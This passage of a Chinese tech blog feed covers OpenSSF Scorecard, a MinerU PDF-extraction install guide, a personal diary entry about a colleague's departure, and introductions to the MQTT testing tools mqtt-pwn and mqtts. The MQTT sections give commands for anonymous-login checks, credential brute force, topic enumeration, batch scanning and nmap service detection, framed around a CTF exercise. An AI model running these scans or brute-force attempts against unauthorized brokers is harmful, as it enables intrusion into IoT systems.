https://github.com/ossf/scorecard/blob/a8eae2d833553e93021a22f5641661cb6ad3e24c/docs/checks.md#vulnerabilities        </span>|<br>|<span class="hljs-string">         </span>|<span class="hljs-string">                        </span>|<span class="hljs-string"> detected                       </span>|<span class="hljs-string">                                                                                                                       </span>|<br>|<span class="hljs-string">---------</span>|<span class="hljs-string">------------------------</span>|<span class="hljs-string">--------------------------------</span>|<span class="hljs-string">-----------------------------------------------------------------------------------------------------------------------</span>|<br></code></pre></td></tr></table></figure><p>在默认情况下，Scorecard会对所有检查运行。要运行特定检查，请使用：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">scorecard --repo=<span class="hljs-attribute">&lt;repo_url&gt;</span> --checks <span class="hljs-attribute">&lt;check1,check2&gt;</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">scorecard <span class="hljs-params">--repo=https</span>:<span class="hljs-string">//github.com/ossf/scorecard</span> <span class="hljs-params">--checks</span> Code-Review,Maintained<br></code></pre></td></tr></table></figure><p>使用SARIF文件导出到GitHub Security<br>可以将Scorecard检查结果导出到GitHub Security工具（由GitHub Actions自动生成）。为此，使用–format参数生成一个SARIF文件并上传：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">scorecard <span class="hljs-attr">--repo</span>=&lt;repo_url&gt; <span class="hljs-attr">--format</span> sarif &gt; results<span class="hljs-selector-class">.sarif</span><br>gh upload results.sarif<br></code></pre></td></tr></table></figure><p>使用原始数据导出<br>默认情况下，scorecard导出json格式的结果。可以使用以下参数导出结果：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">scorecard</span> <span class="hljs-literal">--</span><span class="hljs-comment">repo=</span>&lt;<span class="hljs-comment">repo_url</span>&gt; <span class="hljs-literal">--</span><span class="hljs-comment">format json</span> <span class="hljs-literal">--</span><span class="hljs-comment">show</span><span class="hljs-literal">-</span><span class="hljs-comment">details</span> &gt; <span class="hljs-comment">results</span><span class="hljs-string">.</span><span class="hljs-comment">json</span><br></code></pre></td></tr></table></figure><h2 id="检查项介绍"><a href="#检查项介绍" class="headerlink" title="检查项介绍"></a>检查项介绍</h2><p>检查项详细来源：<a href="https://github.com/ossf/scorecard/blob/main/docs/checks.md">https://github.com/ossf/scorecard/blob/main/docs/checks.md</a></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Binary-Artifacts(二进制组件)</td><td>检查项目中是否包含二进制文件</td></tr><tr><td>Branch-Protection(分支保护)</td><td>github 是否启用分支保护</td></tr><tr><td>CI-Tests(CI测试)</td><td>在合并分支请求之前是否配置CI测试</td></tr><tr><td>CII-Best-Practices(CII最佳实践)</td><td>是否遵循CII最佳实践</td></tr><tr><td>Code-Review(代码审计)</td><td>检测项目在合并代码之前是否进行代码审计</td></tr><tr><td>Contributors(贡献者)</td><td>检查项目是否有多个贡献者</td></tr><tr><td>Dangerous-Workflow(不安全的工作流)</td><td>检查github action配置是否不安全</td></tr><tr><td>Dependency-Update-Tool(依赖更新工具)</td><td>检查项目是否使用依赖更新工具</td></tr><tr><td>Fuzzing(模糊测试)</td><td>检查项目是否进行模糊测试</td></tr><tr><td>License(许可协议)</td><td>检查项目是否声明了许可协议</td></tr><tr><td>Maintained(维护)</td><td>检查项目是否积极维护</td></tr><tr><td>Packaging(打包)</td><td>检查项目是否使用组件包的形式进行发布</td></tr><tr><td>Pinned-Dependencies(依赖标识)</td><td>检查项目是否使用包管理器声明依赖信息</td></tr><tr><td>SAST(静态代码扫描)</td><td>检查项目是否进行静态代码扫描</td></tr><tr><td>Security-Policy(安全策略)</td><td>检查项目是否声明安全策略</td></tr><tr><td>Signed-Releases(签名发行)</td><td>检查项目是否对发布的组件进行签名</td></tr><tr><td>Token-Permissions(令牌权限)</td><td>检查workflow token是否遵顼最小权限原则</td></tr><tr><td>Vulnerabilities(漏洞)</td><td>使用osv等开源漏洞库检测代码和组件是否包含漏洞</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="企业实践"><a href="#企业实践" class="headerlink" title="企业实践"></a>企业实践</h3><p>1、使用 Scorecard 对第三方开源项目进行安全性评估，综合判断引入的第三方组件的健壮性。<br>2、对企业开源的项目进行评估，提高被维护项目的安全性。</p><h3 id="开发者"><a href="#开发者" class="headerlink" title="开发者"></a>开发者</h3><p>1、对自己开发的项目进行评估，综合提高项目安全性。<br>2、评估引入的第三方组件，提高项目整理健壮性。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://deps.dev/">https://deps.dev/</a></li><li><a href="https://osv.dev/">https://osv.dev/</a></li><li><a href="https://github.com/ossf/scorecard">https://github.com/ossf/scorecard</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Software Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MinerU 介绍</title>
    <link href="/2024/08/05/2024-08-05-MinerU/"/>
    <url>/2024/08/05/2024-08-05-MinerU/</url>
    
    <content type="html"><![CDATA[<h1 id="MinerU-介绍"><a href="#MinerU-介绍" class="headerlink" title="MinerU 介绍"></a>MinerU 介绍</h1><hr><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>处理监管文档会遇到一个比较操蛋的问题就是部分文档只有pdf格式的，并且pdf是扫描版本的，无法直接读取pdf，利用多模态进行处理，目前口袋有比较紧张，最近发现一个宝藏项目，MinerU，子项目(PDF-Extract-Kit)，可以识别pdf，将pdf转成md，方便数据处理和LLM进行对话。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>MinerU 是一款一站式、开源、高质量的数据提取工具，主要包含以下功能:</p><ul><li>Magic-PDF PDF文档提取</li><li>Magic-Doc 网页与电子书提取</li></ul><p>这里主要介绍Magic-PDF，Magic-PDF是一款将 PDF 转化为 markdown 格式的工具。支持转换本地文档或者位于支持S3协议对象存储上的文件。</p><p>主要功能包含</p><ul><li>支持多种前端模型输入</li><li>删除页眉、页脚、脚注、页码等元素</li><li>符合人类阅读顺序的排版格式</li><li>保留原文档的结构和格式，包括标题、段落、列表等</li><li>提取图像和表格并在markdown中展示</li><li>将公式转换成latex</li><li>乱码PDF自动识别并转换</li><li>支持cpu和gpu环境</li><li>支持windows&#x2F;linux&#x2F;mac平台</li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker">conda create -n mineru python=<span class="hljs-number">3.10</span><br>conda activate mineru<br></code></pre></td></tr></table></figure><p><strong>1.安装依赖</strong></p><p>完整功能包依赖detectron2，该库需要编译安装，如需自行编译，请参考 <a href="https://github.com/facebookresearch/detectron2/issues/5114">facebookresearch&#x2F;detectron2#5114</a></p><p>或是直接使用作者预编译的whl包：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">pip install detectron2 --extra-index-url https://wheels.myhloli.com -i https://pypi.tuna.tsinghua.edu.cn/simple <br></code></pre></td></tr></table></figure><p><strong>2.使用pip安装完整功能包</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">pip install magic-pdf[full]==<span class="hljs-number">0.6</span>.<span class="hljs-number">2</span>b1 -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p><strong>3.下载模型权重文件</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">git clone https://www.modelscope.cn/wanderkid/PDF-Extract-Kit.git<br></code></pre></td></tr></table></figure><p><strong>4. 拷贝配置文件并进行配置</strong></p><p>在仓库根目录可以获得 <a href="https://github.com/opendatalab/MinerU/blob/master/magic-pdf.template.json">magic-pdf.template.json</a> 配置模版文件</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">cp magic-pdf.template.json ~/magic-pdf.json<br></code></pre></td></tr></table></figure><p>使用cuda</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs docker">&#123;<br>    <span class="hljs-string">&quot;bucket_info&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;bucket-name-1&quot;</span>:[<span class="hljs-string">&quot;ak&quot;</span>, <span class="hljs-string">&quot;sk&quot;</span>, <span class="hljs-string">&quot;endpoint&quot;</span>],<br>        <span class="hljs-string">&quot;bucket-name-2&quot;</span>:[<span class="hljs-string">&quot;ak&quot;</span>, <span class="hljs-string">&quot;sk&quot;</span>, <span class="hljs-string">&quot;endpoint&quot;</span>]<br>    &#125;,<br>    <span class="hljs-string">&quot;models-dir&quot;</span>:<span class="hljs-string">&quot;/data/models&quot;</span>,<br>    <span class="hljs-string">&quot;device-mode&quot;</span>:<span class="hljs-string">&quot;cuda&quot;</span>,<br>    <span class="hljs-string">&quot;table-config&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;is_table_recog_enable&quot;</span>: false,<br>        <span class="hljs-string">&quot;max_time&quot;</span>: <span class="hljs-number">400</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里有个小坑，从huggingface下载下来的模型目录为：&#x2F;data&#x2F;models&#x2F;PDF-Extract-Kit&#x2F;，此处配置为：&#x2F;data&#x2F;models&#x2F;PDF-Extract-Kit&#x2F;models&#x2F; ，另外目前不支持多卡配置。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>1. 通过命令行使用</strong></p><p><strong>直接使用</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">magic-pdf pdf-command <span class="hljs-params">--pdf</span> <span class="hljs-string">&quot;pdf_path&quot;</span> <span class="hljs-params">--inside_model</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>程序运行完成后，你可以在”&#x2F;tmp&#x2F;magic-pdf”目录下看到生成的markdown文件，markdown目录中可以找到对应的xxx_model.json文件</p><p>如果您有意对后处理pipeline进行二次开发，可以使用命令</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">magic-pdf</span> <span class="hljs-string">pdf-command</span> <span class="hljs-built_in">--pdf</span> <span class="hljs-string">&quot;pdf_path&quot;</span> <span class="hljs-built_in">--model</span> <span class="hljs-string">&quot;model_json_path&quot;</span><br></code></pre></td></tr></table></figure><p>这样就不需要重跑模型数据，调试起来更方便</p><p><strong>更多用法</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">magic-pdf <span class="hljs-comment">--help</span><br></code></pre></td></tr></table></figure><p><strong>2. 通过接口调用</strong></p><p><strong>本地使用</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">image_writer = <span class="hljs-built_in">DiskReaderWriter</span>(local_image_dir)<br>image_dir = <span class="hljs-built_in">str</span>(os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.basename</span>(local_image_dir))<br>jso_useful_key = &#123;<span class="hljs-string">&quot;_pdf_type&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;model_list&quot;</span>: model_json&#125;<br>pipe = <span class="hljs-built_in">UNIPipe</span>(pdf_bytes, jso_useful_key, image_writer)<br>pipe<span class="hljs-selector-class">.pipe_classify</span>()<br>pipe<span class="hljs-selector-class">.pipe_parse</span>()<br>md_content = pipe<span class="hljs-selector-class">.pipe_mk_markdown</span>(image_dir, drop_mode=<span class="hljs-string">&quot;none&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>在对象存储上使用</strong></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs docker">s3pdf_cli = S3ReaderWriter(pdf_ak, pdf_sk, pdf_endpoint)<br>image_dir = <span class="hljs-string">&quot;s3://img_bucket/&quot;</span><br>s3image_cli = S3ReaderWriter(img_ak, img_sk, img_endpoint, parent_path=image_dir)<br>pdf_bytes = s3pdf_cli.read(s3_pdf_path, mode=s3pdf_cli.MODE_BIN)<br>jso_useful_key = &#123;<span class="hljs-string">&quot;_pdf_type&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;model_list&quot;</span>: model_json&#125;<br>pipe = UNIPipe(pdf_bytes, jso_useful_key, s3image_cli)<br>pipe.pipe_classify()<br>pipe.pipe_parse()<br>md_content = pipe.pipe_mk_markdown(image_dir, drop_mode=<span class="hljs-string">&quot;none&quot;</span>)<br></code></pre></td></tr></table></figure><p>本地命令执行效果如下：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">magic-pdf pdf-command --pdf ../PDF-Extract-Kit/inputs/<span class="hljs-number">18.4</span>《信息安全技术\ \ 安全漏洞标识与描述规范》GB_T\ <span class="hljs-number">28458</span>-<span class="hljs-number">2012</span>.pdf --inside_model true<br></code></pre></td></tr></table></figure><p><img src="/img/20240805-01.png" alt="本地命令执行"></p><p>成功</p><p><img src="/img/20240805-02.png" alt="执行成功"></p><p>效果对比</p><p><img src="/img/20240805-03.png" alt="效果对比"></p><p>部分识别错误，但是整体已经很经验</p><p><img src="/img/20240805-04.png" alt="部分瑕疵"></p><p>GPU资源占用效率如下：</p><p><img src="/img/20240805-05.png" alt="GPU资源占用"></p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>1、开源项目中，目前<strong>MinerU可以满足pdf自动化识别需求，方便数据的整理和收集。</strong></p><p>2、由于ocr识别过程中仍会存在个别识别失误，格式混乱问题，如果项目数据要求比较准确，需要慎重考虑</p><p>3、<strong>MinerU的命令行设计的有些反人类，这个属于个人观点</strong></p><h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h2 id="ValueError-Unable-to-avoid-copy-while-creating-an-array-as-requested"><a href="#ValueError-Unable-to-avoid-copy-while-creating-an-array-as-requested" class="headerlink" title="ValueError: Unable to avoid copy while creating an array as requested."></a>ValueError: Unable to avoid copy while creating an array as requested.</h2><p><img src="/img/20240805-06.png" alt="错误"></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">pip install <span class="hljs-string">&quot;numpy&lt;2&quot;</span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/opendatalab/MinerU">https://github.com/opendatalab/MinerU</a></li><li><a href="https://github.com/opendatalab/PDF-Extract-Kit">https://github.com/opendatalab/PDF-Extract-Kit</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>RAG</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>纪念与W工作的三年</title>
    <link href="/2024/07/18/2024-07-18-commemorate-the-past-three-years-of-work/"/>
    <url>/2024/07/18/2024-07-18-commemorate-the-past-three-years-of-work/</url>
    
    <content type="html"><![CDATA[<h1 id="纪念与W工作的三年"><a href="#纪念与W工作的三年" class="headerlink" title="纪念与W工作的三年"></a>纪念与W工作的三年</h1><hr><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>三年前与W先后加入当前公司，一起研发打磨产品，从概念到demo再到客户侧落地，一起经历疫情。有空喝酒吹牛皮，没事角落一起吸二手烟，纵使工作压力山大，但是大家热情高涨，三年虽然不长，但是大家欢乐不少。其中有争执，有协作，总之磕磕绊绊，愉快度过三年。</p><p>24年Q2，大家忙着新产品的迭代更新，公司引入新的研发领导，技术能力未知，但是拉帮结派、向上汇报、PUA下属的能力没谁了，以前看到一个打油诗，描写的挺形象的，内容如下：</p><blockquote><p>沟通过程舔狗化<br>简单问题复杂化<br>业务逻辑撕逼化<br>保底目标战报化<br>辣鸡结果故事化<br>————就是没人话。</p></blockquote><p>由于新来的研发领导想要迅速的把控研发资源，要求W将当前工作交接给自己的心腹，由于W的工作过于繁琐、交接的人员能力一般、交接的时间太短，在交接过程中起了冲突，然后W就被新来的领导记恨上了，这特喵的也太小心眼了。与此同时我出于保护考虑，征求老板的同意后，把W的base划到了我的部门，然后我大概率也被记恨上了，作为交换代价，要求我把之前手上核心项目完全交接出去。之前以为这事告一段落，一个月以后，由于新来的研发领导根本接不下来我们之前研发的平台，然后不知道怎么和老板说的，把W和另一个兄弟给划过去，你没听错，把W和另一个兄弟给划过去了，就是要整你，我他妈的，真实服了，和老板也沟通过，没得商量，真心难受。<br>W重新划到研发部，本来之前负责架构组，划分过去成了研发领导自己心腹的小弟，W自己的工作内容还被边缘化了，Q2结束，没有任何评比，绩效直接给打了C，还放出话，我就是要恶心他，就这样，好端端把一个负责，踏实干活的人给挤兑走了。</p><p><img src="/img/20240718-02.png" alt="W离职"></p><p>W已经离职了快两周了，一直想写一篇纪念性的文章，但是不知道怎么开口，出于各种考虑吧。今天发现被划过去的那个兄弟被新领导恶心的提了离职，我有些忍不了了，心里憋着一口气，不吐不快，但是我无法改变这一切。公司是老板的，用老板的话来说，公司离开谁都转，换句话来说，想干干，不想干滚蛋。没资格规劝老板，毕竟他算是我的前辈，我挺欣赏他，和现在的老板也是萍水相逢，一起出来创业，这次引入这个研发的领导，可能有其他方面考虑。我也不是念旧，就是自己能力太弱，在这里无病呻吟。</p><h2 id="回忆与W工作的点点滴滴"><a href="#回忆与W工作的点点滴滴" class="headerlink" title="回忆与W工作的点点滴滴"></a>回忆与W工作的点点滴滴</h2><h3 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h3><p>W是一个对技术极度热情的程序员，我们做的是安全开发相关的一些平台，但是W刚开始是一个不懂安全的程序员，主要工作内容协助我们把平台进行落地即可，把DEMO进行工程化，解决客户那些匪夷所思的需求即可，但是W在研发过程中，不仅承担了开发的工作，还承担了现场项目经理，研发，运维，DBA等工作，另外学习了不少安全能力，W在工作过程中不断提升研发效能，虽说和研发部的同事因为工作的事起过冲突，基本上是对事不对人，大多数是因为其他同事未能达到要求，或者研发的通病，不喜欢变化，比如：手动打包项目就可以，我为什么要集成到流水线等等。我个人是很欣赏W的，你可能觉得W是狗拿耗子多管闲事，这些是研发的领导需要考虑的，但是之前的研发领导是个传声筒，没太大的作用，这部分基本上都是W和几个热爱技术的同事在为爱发电。个人感觉，对于大多数企业来说，传声筒类型的领导不在少数，下属多余做的，做好了可以是自己的业绩，做差了也没啥事，何乐而不为呢。</p><p>以下这张图片是新冠放开后，坚持到最后的三个合照，其中包括我的徒弟兼同事，现在已经是土澳研究生快一年了，白驹过隙。</p><p><img src="/img/20240718-01.jpg" alt="疫情放开后，坚持到最后的三人"></p><h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p>W这个人比较豪爽，重情义，性情中人，挺对我的口味。休息时一起打球，一起抽烟，我单纯喜欢闻烟味，不喜欢抽烟，被W调侃，间接接吻。W的酒量很好，三年喝了这么多次，没有探出他的酒量有多深，可能自己是个弱鸡，陪不了多少。</p><p>W有个可爱的小姑娘，让我挺羡慕的，由于W原生家庭的一些缘故，W的爱人在老家照顾孩子，W一个人在北京打拼，这次被裁员后，对W影响挺大的，当下经济下行，工作不好找，这个时候被辞退，真是雪上加霜。对此只能希望W接下来可以顺利找到工作。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>祝W写的代码少出bug，调试如有神助，项目进展顺利，事业步步高升！</p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Work</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mqtt-pwn 介绍</title>
    <link href="/2024/07/09/2024-07-09-introduce-mqtt-pwn/"/>
    <url>/2024/07/09/2024-07-09-introduce-mqtt-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="mqtt-pwn-介绍"><a href="#mqtt-pwn-介绍" class="headerlink" title="mqtt-pwn 介绍"></a>mqtt-pwn 介绍</h1><hr><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近在学习车联网相关知识，碰巧媳妇公司CTF题目中有一道车联网的题目，题目方向是MQTT，发现一个mqtt测试工具：mqtt-pwn，这里做记录和学习一下。</p><h2 id="mqtt-安全风险相关"><a href="#mqtt-安全风险相关" class="headerlink" title="mqtt 安全风险相关"></a>mqtt 安全风险相关</h2><ul><li>授权：匿名连接问题，匿名访问则代表任何人都可以发布或订阅消息。如果存在敏感数据或指令，将导致信息泄漏或者被恶意攻击者发起恶意指令；</li><li>传输：默认未加密，则可被中间人攻击。可获取其验证的用户名和密码；</li><li>认证：弱口令问题，由于可被爆破，设置了弱口令，同样也会存在安全风险；</li><li>应用：订阅端明文配置导致泄漏其验证的用户名和密码；</li><li>漏洞：服务端软件自身存在缺陷可被利用，或者订阅端或服务端解析内容不当产生安全漏洞，这将导致整个系统。</li></ul><table><thead><tr><th>id</th><th>漏洞详情</th></tr></thead><tbody><tr><td>1</td><td>1、Eclipse Mosquitto 1.0～1.5.5 存在授权问题漏洞 漏洞公告：<a href="https://www.anquanke.com/vul/id/1514742">https://www.anquanke.com/vul/id/1514742</a></td></tr><tr><td>2</td><td>1、Eclipse Mosquitto &lt;&#x3D; 1.4.15 存在拒绝服务漏洞 漏洞公告：<a href="http://www.nsfocus.net/vulndb/40015">http://www.nsfocus.net/vulndb/40015</a></td></tr><tr><td>3</td><td>2、 Eclipse Mosquitto 1.0～1.5.5存在访问控制漏洞 漏洞公告：<a href="https://www.anquanke.com/vul/id/1514740">https://www.anquanke.com/vul/id/1514740</a></td></tr><tr><td>4</td><td>3、 MQTT 3.4.6之前版本和4.0.5之前的4.0.x版本存在拒绝服务漏洞 漏洞公告：<a href="https://www.anquanke.com/vul/id/1132531">https://www.anquanke.com/vul/id/1132531</a></td></tr><tr><td>5</td><td>4、 MQTT protocol 3.1.1版本中存在安全漏洞 漏洞公告：<a href="https://www.anquanke.com/vul/id/2051251">https://www.anquanke.com/vul/id/2051251</a></td></tr></tbody></table><h2 id="mqtt-pwn-介绍-1"><a href="#mqtt-pwn-介绍-1" class="headerlink" title="mqtt-pwn 介绍"></a>mqtt-pwn 介绍</h2><p>MQTT-PWN是Akamai Threat Research 开发的一个针对物联网（IoT）Broker进行渗透测试和安全评估的强大工具集。但是项目当年未维护，无法直接运行，重新修改后地址如下：<a href="https://github.com/hksanduo/mqtt-pwn">https://github.com/hksanduo/mqtt-pwn</a></p><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">docker</span><span class="hljs-literal">-</span><span class="hljs-comment">compose up</span> <span class="hljs-literal">--</span><span class="hljs-comment">build</span> <span class="hljs-literal">--</span><span class="hljs-comment">detach</span><br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker-compose <span class="hljs-built_in">run</span> cli<br></code></pre></td></tr></table></figure><p><img src="/img/20240709-01.png" alt="启动界面"></p><h4 id="MQTT-PWN-使用"><a href="#MQTT-PWN-使用" class="headerlink" title="MQTT-PWN 使用"></a>MQTT-PWN 使用</h4><p>功能模块支持：</p><ul><li>爆破（Credentials Brute Force）</li><li>执行命令（Command &amp; Control）</li><li>连接（Connect to a Broker）</li><li>信息收集（Infromation Grabber）</li><li>GPS泄露检测（Owntracks(GPS Tracker)）</li><li>Sonofff测试（Sonoff Exploiter）</li><li>topic探测枚举（Enumeration）</li></ul><p><img src="/img/20240709-02.png" alt="help"></p><h4 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h4><p>1、MQTT-PWN不支持EMQX，主要原因是EMQX对返回的数据做了处理，如果获取不到MQTT Server数据的小伙伴不要慌张，对于EMQX可以使用的功能是凭证爆破，也可以用mqtts工具测试，上一篇博客有介绍。 </p><p>2、MQTT-PWN的原理也较为简单，测试EMQX之外的服务，尽可能工具扫描和手动测试结合，主要是探测Topic。 </p><p>3、此处就不一一介绍mqtt-pwn的使用了，各位可以参考官方wiki，写的很详细：<a href="https://mqtt-pwn.readthedocs.io/en/latest/intro.html">https://mqtt-pwn.readthedocs.io/en/latest/intro.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/SPuerBRead/mqtts">https://github.com/SPuerBRead/mqtts</a></li><li><a href="https://www.anquanke.com/post/id/212335">https://www.anquanke.com/post/id/212335</a></li><li><a href="https://mqtt-pwn.readthedocs.io/en/latest/intro.html">https://mqtt-pwn.readthedocs.io/en/latest/intro.html</a></li><li><a href="https://www.secpulse.com/archives/160231.html">https://www.secpulse.com/archives/160231.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Car</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mqtts 介绍</title>
    <link href="/2024/06/24/2024-06-24-introduce-mqtts/"/>
    <url>/2024/06/24/2024-06-24-introduce-mqtts/</url>
    
    <content type="html"><![CDATA[<h1 id="mqtts-介绍"><a href="#mqtts-介绍" class="headerlink" title="mqtts 介绍"></a>mqtts 介绍</h1><hr><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近在学习车联网相关知识，碰巧媳妇公司CTF题目中有一道车联网的题目，题目方向是MQTT，正好可以深入研究一下。</p><h2 id="mqtts介绍"><a href="#mqtts介绍" class="headerlink" title="mqtts介绍"></a>mqtts介绍</h2><p>mqtts是一款mqtt安全测试工具，github地址：<a href="https://github.com/SPuerBRead/mqtts">https://github.com/SPuerBRead/mqtts</a></p><p>主要功能包括如下：</p><ul><li>匿名登陆 (批量)</li><li>emqx embox_plugin_template</li><li>任意用户名密码登陆 (批量)</li><li>用户名密码爆破 (批量)</li><li>获取服务端信息</li><li>尽可能获取所有topic信息</li><li>获取证书信息</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h2 id="支持协议类型"><a href="#支持协议类型" class="headerlink" title="支持协议类型"></a>支持协议类型</h2><ul><li>TCP</li><li>SSL</li><li>WS</li><li>WSS</li></ul><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>自动探测（包含匿名登陆、任意用户名密码登陆、用户名密码爆破，此处爆破使用的是内置密码字典）</p><p><code>./mqtts -t 127.0.0.1 -p 1883 -au</code><br>比如EXMQ默认允许匿名登录，测试结果如下：<br><img src="/img/20240624-03.png" alt="匿名登录测试"></p><p>指定字典，不指定字典会从本地自动加载username.txt和password.txt两个文件。<br><code>./mqtts -t 127.0.0.1 -p 1883 -b -nf username.txt -pf password.txt</code></p><p>获取服务端信息</p><p><code>./mqtts -t 127.0.0.1 -p 1883 -s</code></p><p>获取topic信息</p><p><code>./mqtts -t 127.0.0.1 -p 1883 -ts -w 60</code></p><p>批量测试</p><p><code>./mqtts -tf ./target.txt -au</code></p><p>其他参数见 <code>./mqtts -h</code></p><p>批量扫描文件格式(空格分割，*必填项)</p><p>*host *port protocol clientId username password</p><h2 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h2><p>1、通过端口扫描，发现目标开放1883端口，使用NMAP等进行端口扫描</p><blockquote><p>功能强大的nmap是支持MQTT协议的识别的，可以直接通过nmap进行识别MQTT协议。另外，除上面提到的默认端口外，有的管理员会修改默认端口，这时也可以尝试1884，8084，8884等临近端口以进行快速探测，或前面增加数字等作为组合，如果针对单个目标，则可以探测全部端口。如果进行大规模的扫描或者提升扫描效率，则可以使用masscan、zmap、RustScan等先进性端口扫描，在使用nmap进行协议识别即可。<br>nmap举例命令如下：<code>sudo nmap -p1883,8083,8883 -sS -sV --version-intensity 9 -Pn --open target_ip</code></p></blockquote><p><img src="/img/20240624-02.png" alt="nmap scan example"></p><p>2、使用mqtts测试目标<br><img 